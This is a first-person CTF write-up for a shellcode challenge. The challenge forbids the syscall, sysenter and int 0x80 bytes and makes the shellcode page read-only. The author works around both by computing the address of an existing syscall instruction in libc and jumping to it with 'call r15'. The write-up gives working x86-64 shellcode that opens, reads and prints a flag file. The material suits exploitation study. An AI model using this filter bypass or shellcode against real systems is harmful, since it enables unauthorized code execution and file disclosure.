Introduction

This write-up documents my solution to the syscall-shenanigans shellcode challenge.

The challenge reads bytes from standard input, maps memory for the shellcode, applies a filter, and then executes the supplied bytes as code.

The restriction was that the shellcode could not contain the following system-call instruction sequences: 

0F 05  = syscall
0F 34  = sysenter
CD 80  = int 0x80

At first this looked like a simple shellcode-filter bypass problem. However, there was another important restriction: the challenge removed write permissions from the first page of the shellcode before execution.

That meant I could not simply place harmless bytes in the shellcode, wait for the filter to finish, and then rewrite those bytes into a syscall instruction.



The interesting part of this challenge was not simply avoiding the forbidden bytes. The real problem was finding another way to reach a system-call instruction without modifying the protected shellcode region.

1. Challenge Environment

The challenge maps a region for the supplied shellcode and reads the payload from standard input. 

Mapped 0x2000 bytes for shellcode at 0x14ed5000!

Reading 0x2000 bytes from stdin.

Executing filter...

After filtering, the challenge removes write permissions from the first 4096 bytes. 



Removing write permissions from first 4096 bytes of shellcode.

This was an important detail.

My first thought was to use some form of self-modifying shellcode, similar to replacing harmless placeholder bytes with the required system-call instruction after the filter.

But the shellcode region was no longer writable.

So I had to look for a different route.

2. The Filter

The challenge scans the supplied shellcode for three forbidden byte sequences. 

0F 05
0F 34
CD 80

These correspond to: 

0F 05    syscall
0F 34    sysenter
CD 80    int 0x80

A normal shellcode implementation containing: 

syscall

would therefore fail the filter.

The important observation was that the filter checks the bytes supplied as the shellcode.

It does not provide the shellcode with an arbitrary collection of instructions that can be used to directly encode one of the forbidden patterns.

3. My First Attempts

Initially, I tried to approach the challenge normally.

The obvious solution was to prepare the Linux system-call registers and execute a syscall instruction.

But the direct instruction was immediately ruled out by the filter. 

syscall

0F 05

I then started thinking about constructing the instruction during runtime.

The idea was basically: 

Harmless bytes
      |
      v
Pass filter
      |
      v
Modify bytes
      |
      v
0F 05
      |
      v
syscall

However, this approach ran into the memory-permission restriction.

The challenge removes write permissions from the first 4096 bytes of the shellcode before execution.



So I could not simply modify my original shellcode region after the filter.

After trying these approaches, I started looking at the problem from a different angle.

4. The Question That Changed the Approach

At this point I started thinking:

If I cannot execute a syscall instruction that I put inside my own shellcode, and I cannot modify my shellcode after the filter, why do I need to create the instruction myself?

The process is already running normally.

The process also has shared libraries loaded into memory.



So I started investigating the loaded libc region and looking for an existing system-call instruction that could be reached from the shellcode.

That was the turning point of the challenge for me.

5. Using Existing Code in libc

Instead of creating a new syscall instruction inside the shellcode, I decided to use an instruction that already existed somewhere in the process memory.

The basic idea became: 

Shellcode
    |
    v
Find useful address
    |
    v
Calculate libc-related address
    |
    v
Calculate syscall offset
    |
    v
Store final address in R15
    |
    v
CALL R15
    |
    v
Existing syscall instruction

The shellcode therefore does not need to contain the forbidden 0F 05 sequence itself.

It only needs to calculate the address of the existing instruction and transfer execution to it.

6. Calculating the Address

I had to determine where the relevant libc code was located in memory.

I inspected the available runtime state and used the value available in the register to derive the required address.

The final shellcode begins with: 

lea r14,[rcx-0xec297]
lea r15,[r14+0x410a9]

The first instruction calculates an intermediate address: 

R14 = RCX - 0xEC297

The second instruction then calculates the final target address: 

R15 = R14 + 0x410A9

Conceptually: 

             RCX
              |
              |
        - 0xEC297
              |
              v
             R14
              |
              |
        + 0x410A9
              |
              v
             R15


Because the target address is affected by ASLR (Address Space Layout Randomization), the absolute address of the libc region and the syscall instruction is not guaranteed to remain the same between executions. Therefore, hard-coding the final syscall address would not be reliable. Instead, I calculated the relative offset between the relevant libc base address and the syscall instruction. The shellcode then uses the runtime register value to derive the current base address and adds the previously calculated offset. This allows the shellcode to calculate the correct syscall address automatically at runtime and store the resulting address in R15. The same calculated address can then be used with call r15, without depending on a fixed absolute address.

7. Why R15?

I needed a free general-purpose register to keep the calculated target address.

At that point in the shellcode, R15 was suitable for this job.

Once the address was calculated, I could repeatedly use: 

call r15

without having to recalculate the target every time.

This made the shellcode considerably cleaner.

8. CALL R15

The instruction used to transfer execution is: 

call r15

Its encoding is: 

41 FF D7

The important difference is: 

Forbidden:

0F 05

Used:

41 FF D7

The filter searches for the explicitly forbidden byte sequences. The indirect call does not match those sequences.

When the CPU executes: 

call r15

execution is transferred to the address stored in R15.

In this challenge, that address leads to the existing system-call instruction that I located in the process memory.

I did not create the syscall instruction in my shellcode. I found an existing one and used CALL R15 to reach it.

10. Preparing the Filename

Once the system-call transition problem was solved, the remaining shellcode performs the required file operations.

The filename is constructed directly on the stack. 

xor ecx, ecx
push rcx

mov rax, 0x67616c662f2f
push rax

mov rdi, rsp

The value represents: 

//flag

The stack pointer is then placed into RDI, giving the system call a pointer to the filename.

11. Opening the File

The shellcode prepares the Linux open system call. 

xor esi, esi
xor eax, eax
mov al, 2

The important register state is: 

RAX = 2
RSI = 0
RDI = pointer to "//flag"

The system-call transition is then performed through: 

call r15

The return value is the file descriptor.

It is moved into RDI: 

push rax
pop rdi

12. Creating the Read Buffer

The shellcode uses the stack as a temporary buffer. 

xor ecx, ecx

push rcx
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx

mov rsi, rsp

Eight pushes reserve 64 bytes.

The resulting stack pointer is used as the read buffer: 

RSI = buffer

13. Reading the File

The shellcode prepares the read operation: 

xor edx, edx
mov dl, 64

xor eax, eax

call r15

The register state is: 

RAX = 0
RDI = file descriptor
RSI = buffer
RDX = 64

The call requests up to 64 bytes from the opened file.

14. Reusing the Return Value

The return value from the read operation contains the number of bytes read.

The shellcode moves this value into RDX: 

push rax
pop rdx

This allows the same value to be used as the length argument for the write operation.

15. Writing to stdout

The shellcode prepares the Linux write operation: 

xor eax, eax
mov al, 1

mov edi, eax

call r15

The register state becomes: 

RAX = 1
RDI = 1
RSI = buffer
RDX = bytes read

Here, RDI = 1 represents standard output.

The contents read from the file are therefore written to stdout.

16. Final Call

The shellcode finally performs one more indirect call: 

xor edi, edi
xor eax, eax
call r15

At this point: 

RAX = 0
RDI = 0

The observed execution had already printed the protected output before the process terminated with a segmentation fault.

The challenge disassembly shows the indirect calls: 

0x...5025 | 41 ff d7 | call r15

0x...503d | 41 ff d7 | call r15

0x...5048 | 41 ff d7 | call r15

0x...504f | 41 ff d7 | call r15

The important encoding is: 

41 FF D7

The shellcode does not directly contain: 

0F 05

which was one of the byte sequences rejected by the filter.

21. Important Observation

The main lesson from this challenge was that the filter only checks the specific instruction encodings that it was designed to detect.

The forbidden sequences were: 

0F 05
0F 34
CD 80

The shellcode instead contains: 

41 FF D7

which represents: 

call r15

The shellcode therefore uses an indirect control-flow transfer to an existing instruction rather than directly embedding the forbidden system-call instruction.

22. Final Notes

This challenge initially looked like a simple "no syscall" shellcode problem.

After the normal approach failed and the shellcode page became read-only, I started looking outside the shellcode itself.

That eventually led me to the loaded libc code and the idea of calculating the address of an existing system-call instruction.

The final shellcode stores that calculated address in R15 and uses: 

call r15

for the required system-call transitions.



The final solution therefore did not need to modify the original shellcode at runtime.

Sometimes the easiest way around an instruction restriction is not to generate the instruction yourself, but to find an existing instance and redirect execution to it.
